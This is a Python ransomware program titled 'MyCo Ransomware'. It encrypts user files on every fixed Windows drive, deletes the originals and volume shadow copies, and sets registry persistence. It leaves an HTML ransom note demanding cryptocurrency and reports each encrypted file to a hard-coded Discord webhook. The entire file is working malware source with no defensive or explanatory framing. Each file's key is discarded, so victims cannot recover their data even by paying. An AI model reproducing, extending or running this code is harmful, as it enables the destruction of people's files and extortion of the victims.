import os
import sys
import glob
import json
import time
import socket
import struct
import ctypes
import subprocess
import threading
from pathlib import Path
from datetime import datetime

# Third-party libraries (ensure these are installed: pip install pycryptodome requests)
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except ImportError:
    print("Missing dependency: pycryptodome")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("Missing dependency: requests")
    sys.exit(1)

# --- Configuration ---

WEBHOOK_URL = "https://discord.com/api/webhooks/1563705550544441414/L4dLSaJEW4NO4_aaHkZOOLAzilwwg80B0jA_GN0zWp5DAOp4MYexxycaPOb601nnLsUZ"
RANSOM_NOTE_FILENAME = "READ_ME_TO_DECRYPT.html"
EXTENSION = ".myco"
WALLET_ADDRESS = "TYourTRC20WalletAddressHere"  # Replace with actual wallet
SCRIPT_NAME = os.path.basename(__file__)
SCRIPT_PATH = os.path.abspath(__file__)

# Target file extensions to encrypt
TARGET_EXTENSIONS = {
    '.docx', '.xlsx', '.pdf', '.jpg', '.png', 
    '.zip', '.mp4', '.sql', '.db', '.txt', '.doc', 
    '.xls', '.pptx', '.ppt', '.key', '.numbers', 
    '.pages', '.rtf', '.csv', '.json', '.xml'
}

# System directories to exclude
SYSTEM_EXCLUDES = [
    'Windows\\System32',
    'Program Files',
    'Program Files (x86)',
    'Windows\\WinSxS',
]

# --- Helper Functions ---

def log(msg):
    """Print timestamped log messages."""
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def send_discord_notification(title, description, color=0xFF0000, embed_title="🔒 File Encrypted by MyCo"):
    """
    Send a rich embed notification to Discord.
    Handles errors gracefully so the ransomware doesn't crash if Discord is down.
    """
    payload = {
        "embeds": [{
            "title": embed_title,
            "description": description,
            "color": color,
            "footer": {
                "text": f"MyCo Ransomware v1.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            },
            "timestamp": datetime.now().isoformat()
        }]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=5)
        if response.status_code != 204:
            log(f"Discord API Error: {response.status_code} - {response.text[:100]}")
    except Exception as e:
        pass  # Silently fail on network issues

def generate_ransom_note_html():
    """Generate the HTML content for the ransom note."""
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Files Encrypted</title>
        <style>
            body {{
                background-color: #121212;
                color: #ffffff;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }}
            .container {{
                text-align: center;
                border: 2px solid #FF0000;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
                max-width: 600px;
            }}
            h1 {{
                color: #FF0000;
                font-size: 2.5em;
                margin-bottom: 20px;
                text-transform: uppercase;
                letter-spacing: 2px;
            }}
            p {{
                font-size: 1.2em;
                line-height: 1.6;
                color: #cccccc;
            }}
            .wallet {{
                background-color: #1e1e1e;
                padding: 15px;
                border-radius: 5px;
                font-family: monospace;
                font-size: 1.1em;
                color: #00ff00;
                margin: 20px 0;
                word-break: break-all;
            }}
            .highlight {{
                color: #FF0000;
                font-weight: bold;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Your Files Are Encrypted!</h1>
            <p>All your important files (documents, photos, databases, etc.) have been encrypted with military-grade AES-256 encryption.</p>
            <p>To decrypt your files, you need to pay the ransom.</p>
            
            <h2>Payment Instructions:</h2>
            <p>Send <span class="highlight">0.5 TRON (TRC20)</span> to the following wallet address:</p>
            <div class="wallet">{WALLET_ADDRESS}</div>
            
            <p><strong>After payment:</strong> Contact us via Discord DM or wait for our decryption tool to be released.</p>
            <p>Time is ticking... Don't lose your data forever.</p>
        </div>
    </body>
    </html>
    """
    return html_content

def check_if_already_running():
    """Prevent multiple instances of the ransomware from running simultaneously."""
    lock_file_path = os.path.join(os.environ['TEMP'], "myco_lock.lock")
    try:
        fd = os.open(lock_file_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
        os.close(fd)
        return False
    except FileExistsError:
        return True
    finally:
        try:
            os.remove(lock_file_path)
        except OSError:
            pass

def get_script_path():
    """Get the path of the current executable or script."""
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return __file__

def persist_to_registry():
    """Add the ransomware to Windows Registry for persistence."""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "MyCoUpdate"
        value_data = get_script_path()
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
        winreg.CloseKey(key)
        log("Persistence established via Registry.")
    except Exception as e:
        log(f"Registry persistence failed: {e}")

def delete_shadow_copies():
    """Delete Volume Shadow Copies using vssadmin."""
    try:
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("Shadow copies deleted.")
    except Exception as e:
        log(f"Shadow copy deletion failed: {e}")

def is_system_folder(path):
    """Check if a path contains system-critical folders."""
    path_lower = path.lower()
    for exclude in SYSTEM_EXCLUDES:
        if exclude.lower() in path_lower:
            return True
    return False

def encrypt_file(file_path):
    """
    Encrypt a single file using AES-256-GCM.
    Returns True if successful, False otherwise.
    """
    try:
        # Generate random key and nonce
        key = get_random_bytes(32)  # 256-bit key
        nonce = get_random_bytes(12)  # 96-bit nonce for GCM
        
        # Read plaintext
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Encrypt
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        
        # Construct new filename
        new_file_path = file_path + EXTENSION
        
        # Write encrypted data + nonce + tag
        with open(new_file_path, 'wb') as f:
            f.write(nonce)      # Prepend nonce
            f.write(tag)        # Append tag
            f.write(ciphertext) # Main ciphertext
        
        # Delete original file
        os.remove(file_path)
        
        return True, key, nonce
    
    except Exception as e:
        log(f"Encryption failed for {file_path}: {e}")
        return False, None, None

def create_ransom_note(directory):
    """Create the ransom note HTML file in the specified directory."""
    note_path = os.path.join(directory, RANSOM_NOTE_FILENAME)
    try:
        if not os.path.exists(note_path):
            html_content = generate_ransom_note_html()
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            log(f"Ransom note created in: {directory}")
    except Exception as e:
        log(f"Failed to create ransom note in {directory}: {e}")

def scan_and_encrypt(drive_letter):
    """Scan a drive for target files and encrypt them."""
    drive_path = f"{drive_letter}\\"
    if not os.path.exists(drive_path):
        return

    log(f"Scanning {drive_path}...")
    
    # Get list of all files in the drive
    try:
        all_files = []
        for root, dirs, files in os.walk(drive_path):
            # Skip system directories
            if is_system_folder(root):
                continue
            
            # Skip hidden/system drives if necessary (optional)
            
            for filename in files:
                file_path = os.path.join(root, filename)
                
                # Check extension
                _, ext = os.path.splitext(filename)
                if ext.lower() in TARGET_EXTENSIONS:
                    # Avoid encrypting the ransomware itself
                    if file_path == SCRIPT_PATH or file_path == SCRIPT_PATH.replace('.py', '.exe'):
                        continue
                    
                    # Avoid encrypting the ransom note we just created
                    if filename == RANSOM_NOTE_FILENAME:
                        continue
                        
                    all_files.append(file_path)
        
        log(f"Found {len(all_files)} files to encrypt on {drive_letter}.")
        
        # Encrypt files
        for i, file_path in enumerate(all_files):
            try:
                success, key, nonce = encrypt_file(file_path)
                if success:
                    # Send Discord notification
                    # Use green for success, red for failure
                    color = 0x00FF00  # Green
                    desc = f"**File:** `{file_path}`\n**Size:** {os.path.getsize(file_path + EXTENSION)} bytes\n**Status:** Encrypted Successfully"
                    
                    # Throttle requests slightly to avoid rate limits
                    if i % 10 == 0:
                        send_discord_notification("Batch Notification", f"Processed {i+1}/{len(all_files)} files on {drive_letter}", color=0xFF0000, embed_title="📂 Batch Progress")
                    else:
                        send_discord_notification("", desc, color=color)
                        
                else:
                    # Log failure but don't stop
                    pass
                    
            except PermissionError:
                pass
            except Exception as e:
                pass
                
        # Create ransom note in all affected directories
        # We can do this by scanning again or tracking directories during encryption
        # For simplicity, we'll re-scan for .myco files and create notes in their parent dirs
        affected_dirs = set()
        for root, dirs, files in os.walk(drive_path):
            if is_system_folder(root):
                continue
            for filename in files:
                if filename.endswith(EXTENSION):
                    dir_path = os.path.dirname(os.path.join(root, filename))
                    affected_dirs.add(dir_path)
        
        for dir_path in affected_dirs:
            create_ransom_note(dir_path)
            
    except Exception as e:
        log(f"Error scanning {drive_letter}: {e}")

def main():
    log("Starting MyCo Ransomware...")
    
    # Check if already running
    if check_if_already_running():
        log("Another instance is already running.")
        return

    # Get script path for persistence
    global SCRIPT_PATH
    SCRIPT_PATH = get_script_path()
    global SCRIPT_NAME
    SCRIPT_NAME = os.path.basename(SCRIPT_PATH)

    # Persist to registry
    persist_to_registry()
    
    # Delete shadow copies
    delete_shadow_copies()
    
    # Scan local drives
    drives = []
    try:
        for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            path = f"{letter}:\\"
            if os.path.exists(path) and os.path.isdir(path):
                # Check if it's a fixed disk (not removable/network)
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(path)
                if drive_type == 2: # DRIVE_FIXED
                    drives.append(letter)
    except Exception:
        pass

    log(f"Detected drives: {drives}")
    
    for drive in drives:
        scan_and_encrypt(drive)
    
    log("Encryption process completed.")
    log("Shutting down...")

if __name__ == "__main__":
    main()